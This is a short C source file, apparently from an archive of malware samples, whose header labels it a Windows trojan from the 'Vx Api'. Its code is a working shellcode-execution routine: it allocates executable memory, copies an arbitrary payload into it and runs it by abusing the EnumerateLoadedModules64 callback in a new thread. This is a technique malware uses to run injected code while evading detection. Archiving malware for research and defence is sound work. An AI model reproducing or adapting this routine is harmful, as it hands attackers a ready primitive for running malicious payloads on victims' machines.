/*
  name      Vx Api
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Win32Helper.h"

VOID InvokeEnumerateLoadedModules64CallbackRoutine(LPVOID lpParameter)
{
	EnumerateLoadedModules64(GetCurrentProcessNoForward(), (PENUMLOADED_MODULES_CALLBACK64)lpParameter, NULL);
}

BOOL MpfSceViaEnumerateLoadedModules64(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumerateLoadedModules64CallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}